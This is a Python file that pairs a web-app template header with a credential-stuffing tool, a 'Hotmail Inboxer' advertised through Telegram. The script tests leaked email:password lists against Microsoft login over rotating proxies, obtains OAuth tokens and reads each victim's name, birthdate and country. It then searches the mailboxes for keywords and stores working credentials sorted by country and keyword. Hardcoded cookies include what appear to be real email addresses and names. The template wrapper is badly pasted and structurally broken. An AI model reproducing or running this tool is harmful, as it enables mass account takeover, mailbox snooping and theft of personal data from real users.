"""
=============================================================
  PASTE YOUR PYTHON SCRIPT IN THIS FILE
=============================================================

How it works:
  - The web app calls the `main()` function below when you click
    "Run" in the browser.
  - Anything you `print()` will show up on the web page.
  - You can optionally accept user input from the browser text box
    via the `user_input` argument.

Rules for Vercel:
  - It must FINISH within ~10 seconds (free plan limit). No infinite
    `while True:` loops.
  - There is no terminal, so colorama colors are stripped automatically.

You can write a normal function OR an async function:

    def main(user_input):
        ...

    # or

    async def main(user_input):
        ...

Replace the example body below with your own code.
"""

import asyncio
import aiohttp
from datetime import datetime


async def main(user_input):
   import asyncio,aiohttp,uuid,json,re,time,sys,random,os
from colorama import Fore, init
from user_agent import generate_user_agent
from datetime import datetime

init(autoreset=True)
banner = """
 Telegram: @anasxzerm
 Channel: @anasxzer00
 > Paid checkers available! DM Telegram: @anasxzerm
 ═══════════════════════════════════════
 HOTMAIL INBOXER V3 [UPDATED]
 ═══════════════════════════════════════

 ✓ ALL ISSUES FIXED

 ✓ ORGANIZED RESULTS STRUCTURE
   ├─ Countries Folder → UK.txt | USA.txt | BR.txt | etc...
   ├─ Keywords Folder → test@noreply.com.txt | hello@hi.com.txt
   └─ Custom Folder → Non-hit accounts with details

 ✓ MULTI KEYWORD SEARCHER
   Format: test@noreply.com,hello@hi.com,yo@me.net
   → Creates individual files per keyword automatically, Format test@noreply.com.txt

 ✓ SMART SORTING
   → Hits saved by Country (location detected | Countries Folder)
   → Hits saved by Keyword (each keyword gets own file | Keywords Folder)
   → Complete profile: Birthdate | Name | Total emails | Subjects

 ✓ FEATURES
   • Proxy/Proxyless support
   • Auto-retry on failures
   • Real-time statistics
   • Organized timestamp folders

 ✓ WHAT'S NEW?
 • CPM Increased to 20K
 • 0.0% Skip Rate — Maximum Traffic Quality
"""

print(banner)
print("\n · Join Our Channel (Click the link): https://t.me/+PFhRhnAGDnEwNWQx")
print(" − Wait for 10s ...")

time.sleep(10)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

def rndIP():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

print(" -- @anasxzerm | Hotmail Inboxer [V3]\n")
proxy_option = input(" [+] Proxy or Proxyless: ").strip().lower()

if proxy_option in ['proxy', 'p', 'proxy']:
    mwAnas = 680
    use_proxy = True
    anasProxies = input(" [+] Put Proxies File: ")
else:
    mwAnas = 680
    use_proxy = False

anasCombo = input(" [+] Put Combo: ")
keyCheckk = input(" [+] Keywords: ")
print("—"*60)
keywords = [k.strip() for k in keyCheckk.split(',') if k.strip()]
current_time = datetime.now().strftime("%I.%M%p")
results_folder = f"Results_{current_time}"
os.makedirs(results_folder, exist_ok=True)

countries_folder = os.path.join(results_folder, "Countries")
keywords_folder = os.path.join(results_folder, "Keywords")
os.makedirs(countries_folder, exist_ok=True)
os.makedirs(keywords_folder, exist_ok=True)

anasHits = 0
anasBad = 0
anasCustom = 0
anasWhite = 0
anasTotalComboLines = 0
anasTotalProxyLines = 0
anasProcessedAccounts = set()
lock = asyncio.Lock()
anasComboList = []
country_written = {}
proxy_list = []
failed_proxies = set()

def anasLoadC():
    global anasTotalComboLines, anasComboList
    try:
        with open(anasCombo, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and '@' in line and ':' in line:
                    anasComboList.append(line)
                    anasTotalComboLines += 1
    except:
        with open(anasCombo, 'r', encoding='latin-1', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and '@' in line and ':' in line:
                    anasComboList.append(line)
                    anasTotalComboLines += 1

def anasLoadP():
    global anasTotalProxyLines, proxy_list
    if not use_proxy:
        return
    
    try:
        with open(anasProxies, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line:
                    proxy_list.append(line)
                    anasTotalProxyLines += 1
    except:
        with open(anasProxies, 'r', encoding='latin-1', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line:
                    proxy_list.append(line)
                    anasTotalProxyLines += 1

def anasGetProxy():
    if not use_proxy or not proxy_list:
        return None
    
    available_proxies = [p for p in proxy_list if p not in failed_proxies]
    if not available_proxies:
        return None
    
    return random.choice(available_proxies)

def anasFormProxy(proxy):
    if not proxy:
        return None
    
    try:
        if '@' in proxy:
            userpass, ipport = proxy.split('@')
            user, passwd = userpass.split(':')
            ip, port = ipport.split(':')
            return f"http://{user}:{passwd}@{ip}:{port}"
        else:
            ip, port = proxy.split(':')
            return f"http://{ip}:{port}"
    except:
        return None

def anasShowStats():
    sys.stdout.write(
        f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | {Fore.RED}Bad{Fore.WHITE}: {anasBad} | {Fore.CYAN}Custom{Fore.WHITE}: {anasCustom} | {Fore.YELLOW}Retries{Fore.WHITE}: {anasWhite} | {Fore.MAGENTA}Remaining{Fore.WHITE}: {len(anasComboList) - len(anasProcessedAccounts)}"
    )
    sys.stdout.flush()

async def write_to_country(country, combo):
    async with lock:
        if country not in country_written:
            country_written[country] = set()
        
        if combo in country_written[country]:
            return
        
        country_written[country].add(combo)
        country_filename = os.path.join(countries_folder, f"{country}.txt")
        try:
            with open(country_filename, 'a', encoding='utf-8') as f:
                f.write(combo + '\n')
        except:
            with open(country_filename, 'a', encoding='latin-1', errors='ignore') as f:
                f.write(combo + '\n')

def ect(search_text):
    topics = []
    start = 0
    while True:
        topic_start = search_text.find('"ConversationTopic":"', start)
        if topic_start == -1:
            break
        
        topic_start += len('"ConversationTopic":"')
        topic_end = search_text.find('"', topic_start)
        
        if topic_end != -1:
            topic = search_text[topic_start:topic_end]
            if topic and topic not in topics:
                topics.append(topic)
            start = topic_end + 1
        else:
            break
    
    return topics

def emdd(search_text):
    dates = []
    start = 0
    while True:
        date_start = search_text.find('"LastModifiedTime":"', start)
        if date_start == -1:
            break
        
        date_start += len('"LastModifiedTime":"')
        date_end = search_text.find('"', date_start)
        
        if date_end != -1:
            date_str = search_text[date_start:date_end]
            if date_str:
                try:
                    if 'T' in date_str:
                        date_part = date_str.split('T')[0]
                        dates.append(date_part)
                    else:
                        dates.append(date_str)
                except:
                    dates.append(date_str)
            start = date_end + 1
        else:
            break
    
    unique_dates = []
    for date in dates:
        if date not in unique_dates:
            unique_dates.append(date)
    
    return unique_dates

async def skinbo(session, access_token, CID, keyword, proxy):
    search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
    search_payload = {
        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "United Kingdom Standard Time",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {
                "Or": [
                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                    {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                ]
            },
            "From": 0,
            "Query": {"QueryString": keyword},
            "RefiningQueries": None,
            "Size": 25,
            "Sort": [
                {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                {"Field": "Time", "SortDirection": "Desc"}
            ],
            "EnableTopResults": True,
            "TopResultsCount": 3
        }],
        "AnswerEntityRequests": [{
            "Query": {"QueryString": "Playstation Sony"},
            "EntityTypes": ["Event", "File"],
            "From": 0,
            "Size": 100,
            "EnableAsyncResolution": True
        }],
        "QueryAlterationOptions": {
            "EnableSuggestion": True,
            "EnableAlteration": True,
            "SupportedRecourseDisplayTypes": [
                "Suggestion", "NoResultModification",
                "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"
            ]
        },
        "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
    }
    search_headers = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {access_token}",
        "X-AnchorMailbox": f"CID:{CID}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json"
    }
    
    try:
        async with session.post(search_url, json=search_payload, headers=search_headers, timeout=aiohttp.ClientTimeout(total=30), proxy=proxy) as response:
            text = await response.text()
            return text, response.status
    except:
        return "", 500

async def pssp(session, email, password, proxy):
    ua = generate_user_agent()
    
    cookies = {
        'MUID': 'b194feeddfc1497eaa11253af2f56982',
        'MSFPC': 'GUID=f9cde696682a4ea09e45fd844217d18b&HASH=f9cd&LV=202510&V=4&LU=1760458573033',
        'mkt': 'en-US',
        'IgnoreCAW': '1',
        'NAP': 'V=1.9&E=1f73&C=86cUdFMfnmZ7xfzYtlregOPaKgIj0OIYYNdIOTn1nZLD6JfLLbdTgA&W=4',
        'ANON': 'A=09D45ED7EE52DBD562396582FFFFFFFF&E=1fcd&W=4',
        'MSPCID': 'c71d4280976b8b3d',
        'SDIDC': 'CqIXMbzmxCGCiWHtxihoVAXdGFPXPv0L*Ol5mDHPqwbFeFy1!cJwSd*kwzPggCgJCg*bfYr0ySSNzqscYAns2QHLm!O8m7pRPuKOVaMHjMK2OEip6EbywIQgNIdXvEB8EPVSoe*ooI1gZXRc*AXCukHHAXgTv5UGRUBbyYzxdbDOK8XKxmG!o6WmxAbLBMrMs2mg8fWoPvHO12XiunR7LLt4Z31Z1lNe0f9o3eGIvhgxBwiybjNCxQYish!LaqipcH!pjQ2luKUWjCB81JrNFfNw!kd8V!8I2F!eaV6qE!Y7BxagfKakYlmggYvJlJF8rSsehZtVsmrdQQupzHgCdFg$',
        'MSPPre': 'chesters9%40hotmail.com%7cc71d4280976b8b3d%7c%7c',
        'JSHP': '3$badgermk%40hotmail.com$BADGER$Badrick$$2$0$0$16333387364404783022$1:iam_kev%40hotmail.com$kevin$clarke$$2$0$0$8926393795397108463$0:kane2002h%40live.co.uk$Kane$Higginson$$2$0$0$10297144745202182512$0:mamm1969%40hotmail.com$AVA$AUSTIN$$2$0$0$407608603801202745$1',
        '__Host-MSAAUTHP': '11-M.C512_BAY.0.U.CmBcqCorm97JeLruDvnjdPdEiiDJXilRWz5JyFRpA!eHl34UaUhkniaEq710kVLtoV1Zxa4c6I4LBz1fGbpqBcV1UdeiBNiSt6Gdv6J5I1gEHZo37atNbpXS6SxHD93m1r0Lpl7oZ140RKDFMbV2NqMkT*2FdCLaSLipyWIFUoQKhLTCWw7twk2IHluez1dvfgpwGfdjnSD!9JktxvdeLbrWAAs12AJzxHZuqTHQh58ckphA054E7sJi8mHoOMMMJ42DUGb2*HdtWFaa9hhTkhiixXIHifrdtMXRVH4eOAZTpD2FMqFW40Unpnnptbn9*oely*r8eOaHrNRDdKCzN7IyUqYtv7B9tyayYx6jbKa5wh4961IKzAzqwryfi96m5L3tYKchWfSMsXAkglHUAEb1duupt7vftPgl6Y!0kM8rNgsZcS5YzCvCoR3Y94BWpQnmLeetmYyBBAffx9pqedPdsZHHADDKzD8Uk444EpSU5M8b*fewM5RQOy2EddgK89MYQHuNlGi5J5ejkLQNPKVBByGP2kfW94dus2D2sepKw!HluiJb*ZJKPsEg9Kig!FR9*B0FIjT20jMochqpm0ncwDL9GZzLOOZMgSRBjU0J',
        'MSCC': f'{rndIP()}-IQ',
        'fptctx2': 'taBcrIH61PuCVH7eNCyH0Iitb%252bEMfwlgK%252fM8w%252f28EbfqdlLszKtffCLeV85mZPXP0Likm9tkcCDoEqO%252bikwb2B9eWXZ00luY%252bNzPI%252fyjB7CcbiBIS6L2GWZ86TWJajvmMIhpIRAyZX5swCKNLEBsND0JidkM4528yspq%252fzGp8t7iMU9o6yER%252fSz5laigsdovvFTeismDFwxyUI3mgN1yQryVFi7LzMzZlCvpBC2cZOdsGYU0YF3ylKO%252fTIMLqzkAytspMHT89CwBMPWPdjcpz4CsofGFEXXgoulGt4VDpusbTDxc889aFn7pUOYqY34XQRAYVzljxSRvslfxuCdurg%253d%253d',
        'uaid': '4b709f22853147209c6626f483da628e',
        'MSPRequ': 'id=N&lt=1761343911&co=0',
        'OParams': '11O.DmtAawhbhjwlhVvuYOc4dhba!rdHDU3m349CZgyLY5bjiHk5v0WUiOQ01!LHRYUAyhoBX59UJwwew92z2HolAe3dukNCp6DAsvmSs29dJqk0Ck3M*rlThd8dk0fQzRm3EZGQ*fzBfjdhbAju9Wv5IgL7Rk51HcV9wparcGzl28Wt',
        'ai_session': 'x0vslOk9D7nVZDJoODbEqP|1761343892893|1761344049243',
        'MSPOK': '$uuid-0b216397-f7b7-4127-8523-a58412fb7801$uuid-06de9906-d2cf-4799-856d-b1d6b4393eb0$uuid-0badc28b-e4ae-4fa6-80d3-38715cd03b75',
    }
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,ckb-IQ;q=0.8,ckb;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': ua,
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
    }
    
    params = {
        'contextid': '569A8FDA6DE654A2',
        'opid': 'C647A71CDCAE7375',
        'bk': '1761343911',
        'uaid': '4b709f22853147209c6626f483da628e',
        'pid': '0',
    }
    
    data = (
        f'ps=2&psRNGCDefaultType=1&psRNGCEntropy=62&psRNGCSLK=-Dhga*gJmsUOShMIpNL3SJ%21938TwIZnRfM2WpEPKDn17hAM7cWoZi6Y8ZsrwBlcqszQYtoRNyC*sx*sE%21yD5R9dUHtS*DCgKFC%21Qwxb1b52jAREElo4Tb3CPYiwXChBgMWG0Nep96Xm3nbErZLjWk2CD5gBsgADpEOZO%21ysUg%21s28mc5sWpGYsYqhXu5FcMiUILewyBtNHXC*ETit84CEE4cEFO2hlQdi314NPXjioiP9&canary=&ctx=&hpgrequestid=&PPFT=-DnF8l384pFR%21JHiCHEtmsbjM0XK366QEMuvkoYW92KEefG5Wqfowm5VPCQY6VVLiSCFmx2gnuVlEp9WQi03z%21JPjyfcbU57mxrXvLMmPpKcCR1qazcHFgsjG6GYhuXg4fJsAnZHKXERenbAcEFdyhX4%21QwkVd2Tq8ng6yL2fjidCJY6hJ6yGpUGf1R3CD%21R7v4RlPEQE2zSCLUOo1xTw7yp*vhES%21bphHR4wFqhT4Jb%21CAzdZWFNn2z2d67h3TOSFg%24%24&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}'
    )
    
    session.cookie_jar.update_cookies(cookies)
    
    try:
        async with session.post('https://login.live.com/ppsecure/post.srf', params=params, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=30), proxy=proxy) as response:
            return await response.text()
    except:
        return ""

async def process_account(semaphore, combo):
    global anasHits, anasBad, anasCustom, anasWhite
    
    async with semaphore:
        async with lock:
            if combo in anasProcessedAccounts:
                anasShowStats()
                return
            anasProcessedAccounts.add(combo)
        
        if '@' not in combo or ':' not in combo:
            anasShowStats()
            return
        
        email, password = combo.split(':', 1)
        retries = 0
        max_retries = 3
        newRetries = 0
        
        while retries < max_retries:
            proxy = anasGetProxy() if use_proxy else None
            proxy_url = anasFormProxy(proxy) if proxy else None
            
            connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
            async with aiohttp.ClientSession(connector=connector, trust_env=True) as session:
                try:
                    ppsecure_response = await pssp(session, email, password, proxy_url)
                    if not ppsecure_response or 'sSigninName' not in ppsecure_response:
                        async with lock:
                            anasBad += 1
                        break
                    
                    url = (
                        "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                        "client_info=1&haschrome=1&login_hint=" + str(email) +
                        "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                        "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                        "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                    )
                    headers = {
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "1",
                        "User-Agent": generate_user_agent(),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                                  "image/avif,image/webp,image/apng,*/*;q=0.8,"
                                  "application/signed-exchange;v=b3;q=0.9",
                        "return-client-request-id": "false",
                        "client-request-id": str(uuid.uuid4()),
                        "x-ms-sso-ignore-sso": "1",
                        "correlation-id": str(uuid.uuid4()),
                        "x-client-ver": "1.1.0+9e54a0d1",
                        "x-client-os": "28",
                        "x-client-sku": "MSAL.xplat.android",
                        "x-client-src-sku": "MSAL.xplat.android",
                        "X-Requested-With": "com.microsoft.outlooklite",
                        "Sec-Fetch-Site": "none",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1",
                        "Sec-Fetch-Dest": "document",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9",
                    }
                    
                    async with session.get(url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=30), proxy=proxy_url) as response:
                        response_text = await response.text()
                    
                    PPFT = ""
                    urlPost = ""
                    
                    server_data_pattern = r'var ServerData = ({.*?});'
                    server_data_match = re.search(server_data_pattern, response_text, re.DOTALL)
                    
                    if server_data_match:
                        try:
                            server_data_json = server_data_match.group(1)
                            server_data = json.loads(server_data_json)
                            sFTTag = server_data.get('sFTTag', '')
                            if sFTTag:
                                ppft_pattern = r'value="([^"]+)"'
                                ppft_match = re.search(ppft_pattern, sFTTag)
                                if ppft_match:
                                    PPFT = ppft_match.group(1)
                            urlPost = server_data.get('urlPost', '')
                        except json.JSONDecodeError:
                            pass
                    
                    if not PPFT:
                        start_marker = 'name="PPFT" value="'
                        start_index = response_text.find(start_marker)
                        if start_index != -1:
                            start_index += len(start_marker)
                            end_index = response_text.find('"', start_index)
                            PPFT = response_text[start_index:end_index] if end_index != -1 else ""
                    
                    if not urlPost:
                        urlpost_pattern = r'"urlPost":"([^"]+)"'
                        urlpost_match = re.search(urlpost_pattern, response_text)
                        if urlpost_match:
                            urlPost = urlpost_match.group(1)
                    
                    cookies_dict = {}
                    for cookie in session.cookie_jar:
                        cookies_dict[cookie.key] = cookie.value
                    
                    MSPRequ = cookies_dict.get('MSPRequ', '')
                    uaid = cookies_dict.get('uaid', '')
                    MSPOK = cookies_dict.get('MSPOK', '')
                    OParams = cookies_dict.get('OParams', '')
                    referer_url = str(response.url)
                    
                    if not PPFT or not urlPost:
                        async with lock:
                            anasBad += 1
                        break
                    
                    data_string = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
                    LEN = len(data_string)
                    
                    headers_post = {
                        "User-Agent": generate_user_agent(),
                        "Pragma": "no-cache",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Host": "login.live.com",
                        "Connection": "keep-alive",
                        "Content-Length": str(LEN),
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": "1",
                        "Origin": "https://login.live.com",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-Requested-With": "com.microsoft.outlooklite",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1",
                        "Sec-Fetch-Dest": "document",
                        "Referer": referer_url,
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid}; MSPOK={MSPOK}; OParams={OParams}"
                    }
                    
                    async with session.post(urlPost, data=data_string, headers=headers_post, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=30), proxy=proxy_url) as post_response:
                        pass
                    
                    cookies_dict = {}
                    for cookie in session.cookie_jar:
                        cookies_dict[cookie.key] = cookie.value
                    
                    if "__Host-MSAAUTHP" not in cookies_dict:
                        async with lock:
                            anasBad += 1
                        break
                    
                    auth_code = ""
                    if post_response.status in [301, 302, 303, 307, 308]:
                        redirect_url = post_response.headers.get('Location', '')
                        if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
                            auth_code = redirect_url.split('code=')[1].split('&')[0]
                    
                    CID = cookies_dict.get('MSPCID', '')
                    if CID:
                        CID = CID.upper()
                    
                    access_token = ""
                    if auth_code:
                        url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                        data_token = {
                            "client_info": "1",
                            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                            "grant_type": "authorization_code",
                            "code": auth_code,
                            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                        }
                        async with session.post(url_token, data=data_token, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=aiohttp.ClientTimeout(total=30), proxy=proxy_url) as token_response:
                            if token_response.status == 200:
                                token_data = await token_response.json()
                                access_token = token_data.get("access_token", "")
                    
                    if access_token and CID:
                        newRetries += 1
                        await asyncio.sleep(0.0001)
                        
                        if newRetries >= 5:
                            async with lock:
                                anasBad += 1
                            break
                        
                        Name = ""
                        Country = ""
                        Birthdate = "N/A"
                        
                        profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
                        profile_headers = {
                            "User-Agent": "Outlook-Android/2.0",
                            "Pragma": "no-cache",
                            "Accept": "application/json",
                            "ForceSync": "false",
                            "Authorization": f"Bearer {access_token}",
                            "X-AnchorMailbox": f"CID:{CID}",
                            "Host": "substrate.office.com",
                            "Connection": "Keep-Alive",
                            "Accept-Encoding": "gzip"
                        }
                        async with session.get(profile_url, headers=profile_headers, timeout=aiohttp.ClientTimeout(total=30), proxy=proxy_url) as pRes:
                            if pRes.status == 200:
                                profile_data = await pRes.json()
                                if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
                                    first_account = profile_data["accounts"][0]
                                    Country = first_account.get("location", "")
                                    BD = first_account.get("birthDay", "")
                                    BM = first_account.get("birthMonth", "")
                                    BY = first_account.get("birthYear", "")
                                    if BD and BM and BY:
                                        BD_str = str(BD).zfill(2)
                                        BM_str = str(BM).zfill(2)
                                        Birthdate = f"{BY}-{BM_str}-{BD_str}"
                                if "names" in profile_data and len(profile_data["names"]) > 0:
                                    first_name = profile_data["names"][0]
                                    Name = first_name.get("displayName", "")
                        
                        hit_found = False
                        for keyword in keywords:
                            search_text, status_code = await skinbo(session, access_token, CID, keyword, proxy_url)
                            
                            if status_code == 400:
                                async with lock:
                                    anasWhite += 1
                                retries += 1
                                await asyncio.sleep(0.0001)
                                continue
                            
                            if status_code == 200:
                                total_start = search_text.find('"Total":')
                                if total_start != -1:
                                    total_start += len('"Total":')
                                    total_end = search_text.find(',', total_start)
                                    if total_end == -1:
                                        total_end = search_text.find('}', total_start)
                                    Total = search_text[total_start:total_end] if total_end != -1 else "0"
                                else:
                                    Total = "0"
                                
                                topics = ect(search_text)
                                dates = emdd(search_text)
                                
                                if Total != "0":
                                    topics_str = f"[{', '.join(topics)}]" if topics else "[]"
                                    dates_str = f"[{', '.join(dates)}]" if dates else "[]"
                                    
                                    async with lock:
                                        anasHits += 1
                                    
                                    hit_line = f"{email}:{password} | Name: {Name} | Birthdate: {Birthdate} | Country: {Country} | Total: {Total} | Dates: {dates_str} | Subjects: {topics_str}"
                                    
                                    keyword_filename = os.path.join(keywords_folder, f"{keyword}.txt")
                                    try:
                                        with open(keyword_filename, 'a', encoding='utf-8') as f:
                                            f.write(hit_line + '\n')
                                    except:
                                        with open(keyword_filename, 'a', encoding='latin-1', errors='ignore') as f:
                                            f.write(hit_line + '\n')
                                    
                                    if Country:
                                        await write_to_country(Country, f"{email}:{password}")
                                    
                                    hit_found = True
                        
                        if not hit_found:
                            async with lock:
                                anasCustom += 1
                            
                            if Country:
                                await write_to_country(Country, f"{email}:{password}")
                            
                            custom_folder = os.path.join(results_folder, "Custom")
                            os.makedirs(custom_folder, exist_ok=True)
                            custom_file = os.path.join(custom_folder, "custom.txt")
                            try:
                                with open(custom_file, 'a', encoding='utf-8') as f:
                                    f.write(f"{email}:{password}\n")
                            except:
                                with open(custom_file, 'a', encoding='latin-1', errors='ignore') as f:
                                    f.write(f"{email}:{password}\n")
                    
                    else:
                        async with lock:
                            anasBad += 1
                    
                    break
                    
                except aiohttp.ClientHttpProxyError as e:
                    if proxy:
                        async with lock:
                            failed_proxies.add(proxy)
                    async with lock:
                        anasWhite += 1
                    retries += 1
                    await asyncio.sleep(0.0001)
                    continue
                    
                except (aiohttp.ClientConnectorError, asyncio.TimeoutError, aiohttp.ClientError) as e:
                    async with lock:
                        anasWhite += 1
                    retries += 1
                    await asyncio.sleep(0.0001)
                    continue
                    
                except Exception as e:
                    async with lock:
                        anasBad += 1
                    break
                
                finally:
                    anasShowStats()
        
        anasShowStats()

async def main():
    anasLoadC()
    if use_proxy:
        anasLoadP()
    
    semaphore = asyncio.Semaphore(mwAnas)
    tasks = []
    
    for combo in anasComboList:
        task = asyncio.create_task(process_account(semaphore, combo))
        tasks.append(task)
    
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
